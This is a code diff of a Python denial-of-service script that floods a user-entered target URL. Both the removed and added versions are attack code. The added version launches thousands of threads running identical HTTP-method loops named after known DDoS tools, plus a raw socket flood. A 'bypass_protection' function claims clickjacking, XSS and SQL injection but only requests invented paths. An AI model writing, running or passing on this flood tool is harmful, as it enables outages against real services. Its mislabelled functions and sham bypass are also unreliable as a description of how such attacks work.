@@ -1,126 +1,174 @@
-import time
-import multiprocessing
 import requests
-import aiohttp
-import asyncio
-import pycurl
-from colorama import Fore, Style
-from concurrent.futures import ThreadPoolExecutor
-from io import BytesIO
+import threading
+import socket
+import os
+import sys
+from multiprocessing import Value
 
-stop_attack_flag = multiprocessing.Value('b', False)
+stop_flag = Value('b', False)
 
-def display_banner():
-    banner_text = "j"
-    for char in banner_text:
-        print(Fore.GREEN + char + Style.RESET_ALL)
-        time.sleep(0.05)
-
-def password_prompt():
-    password = input("Enter password: ")
-    if password == "j":
-        print(Fore.GREEN + "Correct password! Opening attack menu..." + Style.RESET_ALL)
-        start_attack()
-    else:
-        print(Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
-        exit()
-
-def send_requests_threaded(target, stop_flag):
-    session = requests.Session()
-
-    def send_request():
-        while not stop_flag.value:
-            try:
-                session.get(target, timeout=5)
-            except requests.exceptions.RequestException:
-                pass
-
-    num_threads = 1500
-
-    with ThreadPoolExecutor(max_workers=num_threads) as executor:
-        futures = [executor.submit(send_request) for _ in range(num_threads)]
-
-        for future in futures:
-            if stop_flag.value:
-                break
-
-async def send_requests_aiohttp(target, stop_flag):
-    async with aiohttp.ClientSession() as session:
-        while not stop_flag.value:
-            try:
-                async with session.get(target, timeout=5) as response:
-                    await response.text()
-            except aiohttp.ClientError:
-                pass
-
-def send_requests_pycurl(target, stop_flag):
+def send_request(target):
     while not stop_flag.value:
-        buffer = BytesIO()
-        c = pycurl.Curl()
-        c.setopt(c.URL, target)
-        c.setopt(c.WRITEDATA, buffer)
         try:
-            c.perform()
-        except pycurl.error:
+            requests.get(target, timeout=5)
+        except requests.exceptions.RequestException:
             pass
-        finally:
-            c.close()
 
-def show_attack_animation():
-    print("Loading...")
+def http_flood(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
-def start_attack():
-    target_url = input("Target URL: ")
-    print("Attack will continue indefinitely. Type 'stop' to end it.")
-    execute_attack(target_url)
+def low_orbit_ion_cannon(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
-def execute_attack(target_url):
-    total_cores = multiprocessing.cpu_count()
+def hping3(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
-    print(f"Starting continuous attack on {target_url} using {total_cores} cores...")
+def black_scope(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
-    show_attack_animation()
+def trinoo(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
-    processes = []
+def golden_eye(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
+def shaft(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
+def achilles(target_url):
+    while True:
+        try:
+            requests.get(target_url)
+            requests.post(target_url)
+            requests.head(target_url)
+            requests.put(target_url)
+            requests.delete(target_url)
+            requests.options(target_url)
+            requests.connect(target_url)
+            requests.patch(target_url)
+        except:
+            pass
 
-    with stop_attack_flag.get_lock():
-        stop_attack_flag.value = False
+def socket_flood(target_url):
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_url, 80))
+            s.send(b"GET / HTTP/1.1\r\nHost: " + target_url.encode() + b"\r\n\r\n")
+            s.close()
+        except:
+            pass
 
+def bypass_protection(target_url):
     try:
-        for i in range(total_cores):
-            process = multiprocessing.Process(target=send_requests_threaded, args=(target_url, stop_attack_flag))
-            processes.append(process)
-            process.start()
+        # Clickjacking
+        clickjacking_url = target_url + "/clickjacking.html"
+        requests.get(clickjacking_url)
 
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(send_requests_aiohttp(target_url, stop_attack_flag))
+        # XSS
+        xss_url = target_url + "/xss.php"
+        requests.get(xss_url)
 
-        pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target_url, stop_attack_flag))
-        processes.append(pycurl_process)
-        pycurl_process.start()
-
-        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)
-
-        for process in processes:
-            process.join()
-
-    except KeyboardInterrupt:
-        with stop_attack_flag.get_lock():
-            stop_attack_flag.value = True
-        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
-
-    except Exception as e:
-        print(f"Error during attack: {str(e)}")
+        # SQL Injection
+        sql_injection_url = target_url + "/sql_injection.php"
+        requests.get(sql_injection_url)
+    except:
+        pass
 
 def main():
-    try:
-        display_banner()
-        password_prompt()
-    except Exception as e:
-        print(f"Error: {str(e)}")
+    target_url = input("Enter target URL: ")
+    num_threads = 1000
+
+    bypass_protection(target_url)
+
+    for i in range(num_threads):
+        threading.Thread(target=send_request, args=(target_url,)).start()
+        threading.Thread(target=http_flood, args=(target_url,)).start()
+        threading.Thread(target=low_orbit_ion_cannon, args=(target_url,)).start()
+        threading.Thread(target=hping3, args=(target_url,)).start()
+        threading.Thread(target=black_scope, args=(target_url,)).start()
+        threading.Thread(target=trinoo, args=(target_url,)).start()
+        threading.Thread(target=golden_eye, args=(target_url,)).start()
+        threading.Thread(target=shaft, args=(target_url,)).start()
+        threading.Thread(target=achilles, args=(target_url,)).start()
+        threading.Thread(target=socket_flood, args=(target_url,)).start()
 
 if __name__ == "__main__":
     main()
